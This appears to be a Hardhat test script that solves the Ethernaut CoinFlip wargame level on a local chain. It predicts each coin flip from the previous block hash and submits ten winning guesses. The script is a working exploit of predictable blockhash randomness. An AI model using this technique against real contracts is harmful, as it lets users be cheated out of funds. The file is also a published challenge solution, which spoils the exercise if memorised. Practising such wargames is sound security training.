import { expect } from "chai";
import { ethers } from "hardhat";

function uint256FromHexString(hexStr: string): bigint {
    // remove 0x prefix and ensure even-length
    if (hexStr.startsWith("0x")) {
      hexStr = hexStr.slice(2);
    }
    if (hexStr.length !== 64) {
      throw new Error("Invalid block hash length for uint256");
    }
    return BigInt("0x" + hexStr);
}
  

describe("Ethernaut Level 3 - CoinFlip", function () {
    it("should win 10 times in a row by predicting blockhash-based coin flips", async () => {
        const [attacker] = await ethers.getSigners();
        const CoinFlipFactory = await ethers.getContractFactory("CoinFlip");
        const coinFlip = await CoinFlipFactory.deploy();
        await coinFlip.waitForDeployment();

        const FACTOR = 2n ** 256n / 2n;
        const coinFlipAddress = await coinFlip.getAddress();

        // Prime the first block
        await ethers.provider.send("evm_mine", []);

        for (let i = 0; i < 10; i++) {
            // Step 1: Mine block N
            await ethers.provider.send("evm_mine", []);
            const block = await ethers.provider.getBlock("latest");
            if (!block || !block.hash) throw new Error("Missing block hash");
          
            // Step 2: Predict based on block N
            const blockValue = uint256FromHexString(block.hash);
            const coinFlipResult = blockValue / FACTOR;
            const guess = coinFlipResult === 1n;
          
            // Step 3: Send tx in block N+1, which reads blockhash(N)
            const tx = await attacker.sendTransaction({
              to: coinFlipAddress,
              data: coinFlip.interface.encodeFunctionData("flip", [guess]),
            });
          
            const receipt = await tx.wait();
            if (!receipt) throw new Error("No receipt");
          
            const flipEvent = coinFlip.interface.getEvent("FlipResult");
            const eventLog = receipt.logs.find((log) => log.topics[0] === flipEvent!.topicHash);
            if (!eventLog) throw new Error("FlipResult not found");
          
            const decoded = coinFlip.interface.decodeEventLog("FlipResult", eventLog.data, eventLog.topics);
            console.log(`EVENT  >> blockValue=${decoded.blockValue}, actual=${decoded.actualSide}, guess=${decoded.playerGuess}, success=${decoded.success}, totalWins=${decoded.newWins}`);
          
            const wins = await coinFlip.getFunction("consecutiveWins").staticCall();
            console.log(`Flip ${i + 1}: Guess=${guess}, Wins=${wins}`);
          }
                    

        const finalWins = await coinFlip.getFunction("consecutiveWins").staticCall();
        console.log("Final consecutiveWins:", finalWins);
        expect(finalWins).to.equal(10n);
    });
});
